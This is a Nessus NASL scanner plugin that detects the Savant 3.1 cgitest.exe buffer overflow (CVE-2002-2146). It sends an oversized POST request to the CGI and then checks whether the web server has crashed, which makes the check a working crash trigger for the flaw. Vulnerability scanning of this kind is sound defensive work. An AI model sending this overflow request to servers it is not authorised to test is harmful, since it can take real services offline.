#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
########################
# References:
########################
# 
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities
#
########################

if(description)
{
 script_id(11173);
 script_cve_id("CVE-2002-2146");
 script_bugtraq_id(5706);
 script_version("$Revision: 1.12 $");
 
 name["english"] = "Savant cgitest.exe buffer overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
cgitest.exe from Savant web server is installed. This CGI is
vulnerable to a buffer overflow which may allow a cracker to 
crash your server or even run code on your system.

Risk factor : High

Solution : Upgrade your web server or remove this CGI.";

 script_description(english:desc["english"]);
 
 summary["english"] = "Savant cgitest.exe buffer overflow";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


foreach dir (cgi_dirs())
{
 p = string(dir, "/cgitest.exe");
 if(is_cgi_installed_ka(item:p, port:port))
 {
 soc = http_open_socket(port);
 if (! soc) exit(0);

 len = 256;	# 136 should be enough
 req = string("POST ", p, " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
 send(socket:soc, data:req);
 http_close_socket(soc);

 sleep(1);

 if(http_is_dead(port: port))
 {
  security_hole(port);
  exit(0);
  } 
 }
}
